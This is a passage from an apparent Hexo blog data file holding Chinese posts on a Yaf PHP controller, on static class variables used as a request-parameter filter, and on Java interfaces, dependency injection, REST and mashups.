class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">LoginController</span> <span class=\"keyword\">extends</span> <span class=\"title\">AbstractController</span>  </span></span><br><span class=\"line\"><span class=\"class\"></span>&#123;  indexAction()  </span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">   </span><br><span class=\"line\">  <span class=\"keyword\">$this</span>-&gt;getView()-&gt;assign(<span class=\"string\">\"content\"</span>, <span class=\"string\">\"Hello Login\"</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\"> &#125;  <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">indexAction</span><span class=\"params\">()</span>  </span></span><br><span class=\"line\"><span class=\"function\"> </span>&#123; </span><br><span class=\"line\"> </span><br><span class=\"line\">  <span class=\"keyword\">$this</span>-&gt;getView()-&gt;assign(<span class=\"string\">\"content\"</span>, <span class=\"string\">\"Finishied!\"</span>);  </span><br><span class=\"line\">  </span><br><span class=\"line\"> &#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>那么再访问 http://域名/项目名/login/finished 就能访问到新的视图。</p>\n<p>就这么简单。函数里那一条唯一的代码，就是设定 一个名为 content 的变量，其值为 后面的字符串，并把它传到 phtml 上，再由 PHP 渲染。</p>\n<p>前三个问题就解决完了！</p>\n"},{"title":"类、数据与设计模式","date":"2019-07-20T16:00:00.000Z","_content":"面向对象真是一个有趣的玩法。\n\n<!-- more -->\n\n与函数式的写法不同，在函数式中，数据是不可变的。比如我在最开始设定的数据，到达代码的最后，也不会发生任何变化。产生出来的东西只是它们做的映射。比如：\n\n```\n$A = 1\ndo_someting($A)\n//A 还是 1\n```\n\n但对一个类而言，它本身就代表着数据类型。而它的方法便是对这些数据的操作。\n\n在我最近看到的一个例子里，发现这么一种有趣的操作：一个类有两个静态变量，一个变量存储着从网页上传来的 JSON。另一个变量保存着过滤的参数。\n\n```\nclss A{\n    static public $ajax = array();  \n    static public $param = array();\n}\n```\n\n在其它的类文件里，就可以通过这个类保存从网页上传来的参数。\n\n```\nclass B{\n    function __constuct(){\n        if ($this->getRequest()->isXmlHttpRequest()) {  \n             Yaf_Dispatcher::getInstance()->autoRender(FALSE);  \n             header(\"Content-type:application/json;charset=utf-8\");  \n             $json = file_get_contents(\"php://input\");  \n             Filter::$ajax = json_decode($json, true);\n        }\n    }\n}\n```\n\n因为是静态变量，于是，这个 A 类的变量就获得了参数。A 类的子类也得到了这个传过来的参数。于是，我们就可以用子类做一定的过滤。满足某个条件的参数，就放进 param 里。\n\n```\nclass para_Filter extends A{\n    public static do_some_filter(){\n        if (isset(self::$ajax['content'])) {\n            $content = self::contentValid();\n            if ($banner['content'] == $content) {\n                  echo \"content Error\";\n            }\n            self::$param['content'] = $content;\n        }\n    }\n\n    protected static function contentValid(){\n        $stringLength = mb_strlen(self::$ajax['content'],'utf8');\n        if ($stringLength<1 || $stringLength >10000){\n            $content = false;\n        }else{\n            $content = self::$ajax['content'];\n        }\n        if (!$content){\n                echo \"no content Error\";\n        }\n        return $content;\n    }\n}\n```\n\n如果 B 类的子类想要数据，那么只要从 para_Filter 那么得到就可以了。下面也就是我们主函数的部分。\n\n```\nclass xx_Action extends B{\n    public mian(){\n        para_Filter::do_some_filter();\n        $content = A::param['content'];\n    }\n\n    public otherPost(){\n        para_Filter::do_other_filter();\n        ...\n    }\n}\n```\n\n这一套下来，也就大体实现了一个过滤器。如果我要的不是传上来的的 content，想要做新的拓展，那只要再创建新的函数、新的类就可以了。我不用管参数怎么来，只要知道，传过来的东西符不符合我的标准就好了。如果我过滤的标准发生了变化，只要改变 para_Filter 里的方法就好了，其它的地方可以一概不动。\n\n好玩的地方在于：可以看到，A 这个类没有方法，它就是一个数据的集合，一个数据结构。而它的子类，为它拓展了方法，但它们本身依然是数据结构。同时，它也随时在发生变化，而不是简单的映射。 虽然在我们的主函数里，没有对 A 这个类本身做过实例，也没有改变它的函数，但它在确确实实的产生了变化，而且还留在了它的基因里。\n\n因此，我把类看成数据本身，也没错吧 ：)\n","source":"_posts/类、数据与设计模式.md","raw":"---\ntitle: 类、数据与设计模式\ndate: 2019-07-21\ntags:\n---\n面向对象真是一个有趣的玩法。\n\n<!-- more -->\n\n与函数式的写法不同，在函数式中，数据是不可变的。比如我在最开始设定的数据，到达代码的最后，也不会发生任何变化。产生出来的东西只是它们做的映射。比如：\n\n```\n$A = 1\ndo_someting($A)\n//A 还是 1\n```\n\n但对一个类而言，它本身就代表着数据类型。而它的方法便是对这些数据的操作。\n\n在我最近看到的一个例子里，发现这么一种有趣的操作：一个类有两个静态变量，一个变量存储着从网页上传来的 JSON。另一个变量保存着过滤的参数。\n\n```\nclss A{\n    static public $ajax = array();  \n    static public $param = array();\n}\n```\n\n在其它的类文件里，就可以通过这个类保存从网页上传来的参数。\n\n```\nclass B{\n    function __constuct(){\n        if ($this->getRequest()->isXmlHttpRequest()) {  \n             Yaf_Dispatcher::getInstance()->autoRender(FALSE);  \n             header(\"Content-type:application/json;charset=utf-8\");  \n             $json = file_get_contents(\"php://input\");  \n             Filter::$ajax = json_decode($json, true);\n        }\n    }\n}\n```\n\n因为是静态变量，于是，这个 A 类的变量就获得了参数。A 类的子类也得到了这个传过来的参数。于是，我们就可以用子类做一定的过滤。满足某个条件的参数，就放进 param 里。\n\n```\nclass para_Filter extends A{\n    public static do_some_filter(){\n        if (isset(self::$ajax['content'])) {\n            $content = self::contentValid();\n            if ($banner['content'] == $content) {\n                  echo \"content Error\";\n            }\n            self::$param['content'] = $content;\n        }\n    }\n\n    protected static function contentValid(){\n        $stringLength = mb_strlen(self::$ajax['content'],'utf8');\n        if ($stringLength<1 || $stringLength >10000){\n            $content = false;\n        }else{\n            $content = self::$ajax['content'];\n        }\n        if (!$content){\n                echo \"no content Error\";\n        }\n        return $content;\n    }\n}\n```\n\n如果 B 类的子类想要数据，那么只要从 para_Filter 那么得到就可以了。下面也就是我们主函数的部分。\n\n```\nclass xx_Action extends B{\n    public mian(){\n        para_Filter::do_some_filter();\n        $content = A::param['content'];\n    }\n\n    public otherPost(){\n        para_Filter::do_other_filter();\n        ...\n    }\n}\n```\n\n这一套下来，也就大体实现了一个过滤器。如果我要的不是传上来的的 content，想要做新的拓展，那只要再创建新的函数、新的类就可以了。我不用管参数怎么来，只要知道，传过来的东西符不符合我的标准就好了。如果我过滤的标准发生了变化，只要改变 para_Filter 里的方法就好了，其它的地方可以一概不动。\n\n好玩的地方在于：可以看到，A 这个类没有方法，它就是一个数据的集合，一个数据结构。而它的子类，为它拓展了方法，但它们本身依然是数据结构。同时，它也随时在发生变化，而不是简单的映射。 虽然在我们的主函数里，没有对 A 这个类本身做过实例，也没有改变它的函数，但它在确确实实的产生了变化，而且还留在了它的基因里。\n\n因此，我把类看成数据本身，也没错吧 ：)\n","slug":"类、数据与设计模式","published":1,"updated":"2020-03-07T08:01:41.286Z","_id":"ck7h758qi0001633xbc6o4nqv","comments":1,"layout":"post","photos":[],"link":"","content":"<p>面向对象真是一个有趣的玩法。</p>\n<a id=\"more\"></a>\n\n<p>与函数式的写法不同，在函数式中，数据是不可变的。比如我在最开始设定的数据，到达代码的最后，也不会发生任何变化。产生出来的东西只是它们做的映射。比如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$A &#x3D; 1</span><br><span class=\"line\">do_someting($A)</span><br><span class=\"line\">&#x2F;&#x2F;A 还是 1</span><br></pre></td></tr></table></figure>\n\n<p>但对一个类而言，它本身就代表着数据类型。而它的方法便是对这些数据的操作。</p>\n<p>在我最近看到的一个例子里，发现这么一种有趣的操作：一个类有两个静态变量，一个变量存储着从网页上传来的 JSON。另一个变量保存着过滤的参数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clss A&#123;</span><br><span class=\"line\">    static public $ajax &#x3D; array();  </span><br><span class=\"line\">    static public $param &#x3D; array();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在其它的类文件里，就可以通过这个类保存从网页上传来的参数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class B&#123;</span><br><span class=\"line\">    function __constuct()&#123;</span><br><span class=\"line\">        if ($this-&gt;getRequest()-&gt;isXmlHttpRequest()) &#123;  </span><br><span class=\"line\">             Yaf_Dispatcher::getInstance()-&gt;autoRender(FALSE);  </span><br><span class=\"line\">             header(&quot;Content-type:application&#x2F;json;charset&#x3D;utf-8&quot;);  </span><br><span class=\"line\">             $json &#x3D; file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);  </span><br><span class=\"line\">             Filter::$ajax &#x3D; json_decode($json, true);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为是静态变量，于是，这个 A 类的变量就获得了参数。A 类的子类也得到了这个传过来的参数。于是，我们就可以用子类做一定的过滤。满足某个条件的参数，就放进 param 里。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class para_Filter extends A&#123;</span><br><span class=\"line\">    public static do_some_filter()&#123;</span><br><span class=\"line\">        if (isset(self::$ajax[&#39;content&#39;])) &#123;</span><br><span class=\"line\">            $content &#x3D; self::contentValid();</span><br><span class=\"line\">            if ($banner[&#39;content&#39;] &#x3D;&#x3D; $content) &#123;</span><br><span class=\"line\">                  echo &quot;content Error&quot;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            self::$param[&#39;content&#39;] &#x3D; $content;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    protected static function contentValid()&#123;</span><br><span class=\"line\">        $stringLength &#x3D; mb_strlen(self::$ajax[&#39;content&#39;],&#39;utf8&#39;);</span><br><span class=\"line\">        if ($stringLength&lt;1 || $stringLength &gt;10000)&#123;</span><br><span class=\"line\">            $content &#x3D; false;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            $content &#x3D; self::$ajax[&#39;content&#39;];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if (!$content)&#123;</span><br><span class=\"line\">                echo &quot;no content Error&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return $content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果 B 类的子类想要数据，那么只要从 para_Filter 那么得到就可以了。下面也就是我们主函数的部分。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class xx_Action extends B&#123;</span><br><span class=\"line\">    public mian()&#123;</span><br><span class=\"line\">        para_Filter::do_some_filter();</span><br><span class=\"line\">        $content &#x3D; A::param[&#39;content&#39;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public otherPost()&#123;</span><br><span class=\"line\">        para_Filter::do_other_filter();</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这一套下来，也就大体实现了一个过滤器。如果我要的不是传上来的的 content，想要做新的拓展，那只要再创建新的函数、新的类就可以了。我不用管参数怎么来，只要知道，传过来的东西符不符合我的标准就好了。如果我过滤的标准发生了变化，只要改变 para_Filter 里的方法就好了，其它的地方可以一概不动。</p>\n<p>好玩的地方在于：可以看到，A 这个类没有方法，它就是一个数据的集合，一个数据结构。而它的子类，为它拓展了方法，但它们本身依然是数据结构。同时，它也随时在发生变化，而不是简单的映射。 虽然在我们的主函数里，没有对 A 这个类本身做过实例，也没有改变它的函数，但它在确确实实的产生了变化，而且还留在了它的基因里。</p>\n<p>因此，我把类看成数据本身，也没错吧 ：)</p>\n","site":{"data":{}},"excerpt":"<p>面向对象真是一个有趣的玩法。</p>","more":"<p>与函数式的写法不同，在函数式中，数据是不可变的。比如我在最开始设定的数据，到达代码的最后，也不会发生任何变化。产生出来的东西只是它们做的映射。比如：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$A &#x3D; 1</span><br><span class=\"line\">do_someting($A)</span><br><span class=\"line\">&#x2F;&#x2F;A 还是 1</span><br></pre></td></tr></table></figure>\n\n<p>但对一个类而言，它本身就代表着数据类型。而它的方法便是对这些数据的操作。</p>\n<p>在我最近看到的一个例子里，发现这么一种有趣的操作：一个类有两个静态变量，一个变量存储着从网页上传来的 JSON。另一个变量保存着过滤的参数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">clss A&#123;</span><br><span class=\"line\">    static public $ajax &#x3D; array();  </span><br><span class=\"line\">    static public $param &#x3D; array();</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在其它的类文件里，就可以通过这个类保存从网页上传来的参数。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class B&#123;</span><br><span class=\"line\">    function __constuct()&#123;</span><br><span class=\"line\">        if ($this-&gt;getRequest()-&gt;isXmlHttpRequest()) &#123;  </span><br><span class=\"line\">             Yaf_Dispatcher::getInstance()-&gt;autoRender(FALSE);  </span><br><span class=\"line\">             header(&quot;Content-type:application&#x2F;json;charset&#x3D;utf-8&quot;);  </span><br><span class=\"line\">             $json &#x3D; file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);  </span><br><span class=\"line\">             Filter::$ajax &#x3D; json_decode($json, true);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为是静态变量，于是，这个 A 类的变量就获得了参数。A 类的子类也得到了这个传过来的参数。于是，我们就可以用子类做一定的过滤。满足某个条件的参数，就放进 param 里。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class para_Filter extends A&#123;</span><br><span class=\"line\">    public static do_some_filter()&#123;</span><br><span class=\"line\">        if (isset(self::$ajax[&#39;content&#39;])) &#123;</span><br><span class=\"line\">            $content &#x3D; self::contentValid();</span><br><span class=\"line\">            if ($banner[&#39;content&#39;] &#x3D;&#x3D; $content) &#123;</span><br><span class=\"line\">                  echo &quot;content Error&quot;;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            self::$param[&#39;content&#39;] &#x3D; $content;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    protected static function contentValid()&#123;</span><br><span class=\"line\">        $stringLength &#x3D; mb_strlen(self::$ajax[&#39;content&#39;],&#39;utf8&#39;);</span><br><span class=\"line\">        if ($stringLength&lt;1 || $stringLength &gt;10000)&#123;</span><br><span class=\"line\">            $content &#x3D; false;</span><br><span class=\"line\">        &#125;else&#123;</span><br><span class=\"line\">            $content &#x3D; self::$ajax[&#39;content&#39;];</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        if (!$content)&#123;</span><br><span class=\"line\">                echo &quot;no content Error&quot;;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        return $content;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>如果 B 类的子类想要数据，那么只要从 para_Filter 那么得到就可以了。下面也就是我们主函数的部分。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">class xx_Action extends B&#123;</span><br><span class=\"line\">    public mian()&#123;</span><br><span class=\"line\">        para_Filter::do_some_filter();</span><br><span class=\"line\">        $content &#x3D; A::param[&#39;content&#39;];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    public otherPost()&#123;</span><br><span class=\"line\">        para_Filter::do_other_filter();</span><br><span class=\"line\">        ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>这一套下来，也就大体实现了一个过滤器。如果我要的不是传上来的的 content，想要做新的拓展，那只要再创建新的函数、新的类就可以了。我不用管参数怎么来，只要知道，传过来的东西符不符合我的标准就好了。如果我过滤的标准发生了变化，只要改变 para_Filter 里的方法就好了，其它的地方可以一概不动。</p>\n<p>好玩的地方在于：可以看到，A 这个类没有方法，它就是一个数据的集合，一个数据结构。而它的子类，为它拓展了方法，但它们本身依然是数据结构。同时，它也随时在发生变化，而不是简单的映射。 虽然在我们的主函数里，没有对 A 这个类本身做过实例，也没有改变它的函数，但它在确确实实的产生了变化，而且还留在了它的基因里。</p>\n<p>因此，我把类看成数据本身，也没错吧 ：)</p>"},{"title":"面向接口","date":"2019-08-03T16:00:00.000Z","_content":"在实习了一个星期之后，对接口有了更深入的思考。\n\n写代码对我而言只是一种兴趣。由于没有任何人对我做出任何要求，很多时候，我只要求将东西写出来就可以了。每当学到新的东西，就一股脑地加入其中，久而久之，我再翻看过去写的代码，只觉得冗长且难看。好在，这些东西大多数时候只有我一个人看，写成什么样都无所谓了。\n\n<!-- more -->\n\n但现在马上毕业，也不能再任性下去。我得学会和他人合作，共同写出每一个人都能理解的东西。重要的是，当其中一个人离开时，新加入的人可以理解，并很快加入其中。\n\n当然，站在老板的角度上，这样就可以压榨更多员工了。但站在更大的角度上看，我们所做出来的东西，如果能被世界的人理解，并使用，共同创造出一个东西。这一个东西，不会因为时间，空间，乃至人的变化，而变化，它可以被每一个人所继承，所共有，并传递下去，实现永恒，这不是很棒吗？\n\n过去我一直一个人在战斗，虽然也会用大佬做的库，但它们只是我实现目标的工具，并非过程。而这一次，要实现的就是工具。简单来讲，我的职责，从调用者，变成了服务者。既然职责发生了转变，那么思维也要跟着发生转变。\n\n于是，我开始理解，过去无法理解的事情。\n\n## 问题\n\nJAVA 的面向对象中，有一个叫做接口（Interface）的东西。接口很像一个类，又与类不同，比如，接口禁止申明函数的过程。就比如下面的写法：\n\n```\ninterface mouth{\n    public void sayHello();\n}\n\n//下面的写法是禁止的\n\ninterface mouth{\n    public void sayHello(){\n      return \"Hello\";\n    }\n}\n```\n\n那函数没有具体的功能，那它就没用了吗？\n\n不，是有用的，它可以被其它类实现 (implements)，然后赋予这个函数功能。比如下面的写法:\n\n```\npublic class Chinese implements mouth{\n    public void sayHello(){\n        return \"你好！\";\n    }\n}\n\npublic class Japenese implements mouth{\n    public void sayHello(){\n        return \"konijiwa！\";\n    }\n}\n```\n\n很奇怪吧。明明在最开始就可以做到的事情，为什么要在后面用另一个类实现？ 明明可以用继承的方式，为什么要多加一个接口的概念？\n\n## 约定\n\n在现实生活中，充斥着大量的约定。比如说，去买早点，大家都约定好，你给我钱，我给你吃的；手机买回来，充电插头一定是双脚的；无论在哪买的 USB，都能插上电脑，传输数据；无论什么城市，过马路时，红灯都得停下来。。。\n\n小到微观世界，大到整个宇宙，大大小小都围绕着某种约定，做着正确的事。一旦违背了约定，定会遭到惩罚。\n\n仔细思考一下约定这种行为，它必定是由多个人共同承担起。假如世界上只有一个人，他做什么事都不会违背约定。\n\n接口其实也是一种约定。用更准确的说法，便是「协议」(protocol)。\n\n嘴巴有个功能就是说话，至于怎么说，说什么，每个人都有不同的实现方式。中国人有中国人的说法，日本人有日本人的说法，但它们都要满足，会说这个功能（这里只是为了方便解释，就不要问我哑巴怎么办）。\n\n在多人合作时，这样就很方便。只要有接口就好了，具体怎么做就看你的了。但无论你怎么做，都不能违返这个接口定下的规则。\n\n## 服务\n\n当我们尝试将接口变成核心时，就会发现，很多事情变得简单了。\n\n首先，我不再关心调用者实现，调用者也不再关心我的实现。比如有调用者用了我的类做了点事情。\n\n```\nclass user{\n    public function do(Human H){\n        H.sayHello();\n        H.sayGoodbye();\n    }\n}\n```\n\n这里的 H，调用者可以放 Chinese 实例，可以放 Japenese 实例，可以放 American 实例，都无所谓。只要他传进来的东西满足\n\n- 是 Human 类\n- 实现了统一的接口\n\n那就没任何问题。\n\n与之而来的是，我这边的任务也会很轻松。我定义了接口之后，就可以在满足接口的定义下，任意实现功能。\n\n调用者和服务者之间的联系变弱了，但也更强硬了，我们不一定需要你，但我们都必须遵守约定，遵守接口。\n\n## 云服务\n\n现在出现的大量的云服务，也是建立在这个基础之上。如果有兴趣，可以上腾讯云或者阿里云的网站上看看。\n\n![腾讯云服务](1564906395080.png)\n\n如果想要人脸识别的功能，你大可不必亲自实现，只要满足了接口的要求，花点小钱，就可以实现。\n\n## 更深一点的内容\n\n如果只是想了解接口，上面的东西已经足够了。但如果想要来点更深的东西，就继续往下看吧。\n\n### 依赖注入(Dependency Injection)\n\n依賴注入是我在看 Spring 框架时，遇到的第一个词。\n\n之所以用接口，是因为我们在编程时，不得不面对一个问题：依赖。\n\n在实际工作中，经常就会写出这样的东西。\n\n```\npublic BMW_wheel{\n  public void go{\n      System.out.print(\"BMW's wheels working!\");\n  }\n}\n\npublic BMW_Car {\n  Wheel BMW_Wheel;\n  public BWM_Car(){\n    BMW_Wheel = new BMW_Wheel();\n  }\n  public void BMM_Run(){\n     BMW_Wheel.go();\n  }\n}\n\npublic Person{\n  public void drive(){\n     BMW_Car Car = new BMW_Car();\n     Car.BMW_Run();\n  }\n}\n```\n\n上面的代码是没任何问题，事实上，也是可以这么写的。但问题在于，假如我做出的这个东西不是我一个人用，而是分享给很多人用，有的人不想用宝马的轮子，而是想用奔驰的轮子，有的人想改用自己家造的轮子。那么每个人都要读懂上面我写的东西，改得 Car 的实例化过程，最后才能正常的用自己设定的轮子跑起来。如果，假设，在 BMW_Car 又被另一个 Person 类依赖，Person 类被 Company 依赖，那么改动一小点，都会引发滚雪球式的灾难。\n\n而解决这一个问题的思想，就是改变我们的想法，将依赖关系倒转过来。\n\n如果我在写上面的类时，留有一些空隙，问题就会变得很简单。\n\n```\ninterface Car{\n  public void Run(Wheel wheel);\n}\n```\n\n同时，轮子类也做个接口\n\n```\ninterface Wheel{\n  public void go();\n}\n```\n\n之后，实现车类。\n\n```\npublic BMW_Car implement Car{\n  Wheel wheel;\n  public void BMW_Car(Wheel wheel){\n      this.wheel = wheel;\n  }\n  \n  public void Run(){\n    this.wheel.go();\n  }\n}\n\npublic Tesla implements Car{\n  Wheel wheel;\n\n  public void Tesla(Wheel wheel){\n    this.wheel = wheel;\n  }\n\n  public void Run(){\n    this.wheel.go();\n  }\n}\n```\n\n通过接口，轮子类和车轮之间的耦合度降低了。在上面，我不再关心这辆宝马车用的是什么轮子。我要的只是轮子，你只要满足轮子接口的东西就可以了。\n\n你完全可以写成下面的代码。\n\n```\nclass Person{\n  public void driving(){\n      Car BMW_Car = new BMW_Car()\n  }\n}\n```\n\n（为什么不用万能的 Python 来写这段代码？那是因为 Python 是鸭子类型啊，不需要接口）\n\n### REST 风格\n\n解决依赖的方法除了在代码上，我们还可以通过使用更成熟的思想。\n\n在 2000 年，Fielding 大佬的博士论文的第五章，介绍了一种架构风格，叫作 REST（Representation state transfer）。这种风格，如今应用于各大应用中。\n\n简单来说，客户端与服务器交流时，每次请求都与上一次无关。换而言之，每一次请求都不依赖于上一次请求。这样，我们将耦合降到了最低。当我需要资源时，只需要向服务器请求，我只知道向哪一个 URL 请求，根本无需知道我所请求的是分布式系统中的具体的哪一个，因为每一次请求对它们而言，都是崭新的。这样，不需要担心可拓展性。\n\n同时，RESTful 带来的好处还有：改善了可见性。由于每一次请求得到的数据都不应该超过一次请求所得到的数据，因此数据的完整性得到了保证。同时，提升了可靠性。如果请求出了问题，我们也只需要恢复一次请求便可以了。\n\n通过这一风格设计出来的接口，在通用性上会大大增强。\n\n### MASHUP 应用\n\n当接口设计得足够多，与之而来的，应用上的发展也开始了。\n\nmashup 最早起源于音乐界，将不同的音乐混合在一起的演出方式。在如今的 IT 界中，它表示一种应用做法：组合不同的 WEB 服务，合成一个应用。\n\n举个例子。 2018年，GOOGLE 公开了 GOOGLE MAP 的数据接口。因此，每个人都可以用它，和其它服务，比如天气服务接口，做出一个新的应用，在地图上显示每个城市的天气，或者做更有趣的，比如抄袭 Pokemon GO，做个捉妖怪的游戏。\n\nmashup 的组成分成三部分。一部分是服务提供商(者)，一部分是 mashup 站点，一部分是客户端。这三者每一部分都是可替代，我可以用不同服务商提供的 api，这个应用也可是另一个人来做，至于服务端，大多数是基于浏览器，你换成哪一个浏览器都可以。于是，mashup 属于松散耦合，可以说，是利用接口最好的诠释。\n\n---\n\n又说了一大堆无用的东西。\n","source":"_posts/面向接口.md","raw":"---\ntitle: 面向接口\ndate: 2019-08-04\ntags:\n---\n在实习了一个星期之后，对接口有了更深入的思考。\n\n写代码对我而言只是一种兴趣。由于没有任何人对我做出任何要求，很多时候，我只要求将东西写出来就可以了。每当学到新的东西，就一股脑地加入其中，久而久之，我再翻看过去写的代码，只觉得冗长且难看。好在，这些东西大多数时候只有我一个人看，写成什么样都无所谓了。\n\n<!-- more -->\n\n但现在马上毕业，也不能再任性下去。我得学会和他人合作，共同写出每一个人都能理解的东西。重要的是，当其中一个人离开时，新加入的人可以理解，并很快加入其中。\n\n当然，站在老板的角度上，这样就可以压榨更多员工了。但站在更大的角度上看，我们所做出来的东西，如果能被世界的人理解，并使用，共同创造出一个东西。这一个东西，不会因为时间，空间，乃至人的变化，而变化，它可以被每一个人所继承，所共有，并传递下去，实现永恒，这不是很棒吗？\n\n过去我一直一个人在战斗，虽然也会用大佬做的库，但它们只是我实现目标的工具，并非过程。而这一次，要实现的就是工具。简单来讲，我的职责，从调用者，变成了服务者。既然职责发生了转变，那么思维也要跟着发生转变。\n\n于是，我开始理解，过去无法理解的事情。\n\n## 问题\n\nJAVA 的面向对象中，有一个叫做接口（Interface）的东西。接口很像一个类，又与类不同，比如，接口禁止申明函数的过程。就比如下面的写法：\n\n```\ninterface mouth{\n    public void sayHello();\n}\n\n//下面的写法是禁止的\n\ninterface mouth{\n    public void sayHello(){\n      return \"Hello\";\n    }\n}\n```\n\n那函数没有具体的功能，那它就没用了吗？\n\n不，是有用的，它可以被其它类实现 (implements)，然后赋予这个函数功能。比如下面的写法:\n\n```\npublic class Chinese implements mouth{\n    public void sayHello(){\n        return \"你好！\";\n    }\n}\n\npublic class Japenese implements mouth{\n    public void sayHello(){\n        return \"konijiwa！\";\n    }\n}\n```\n\n很奇怪吧。明明在最开始就可以做到的事情，为什么要在后面用另一个类实现？ 明明可以用继承的方式，为什么要多加一个接口的概念？\n\n## 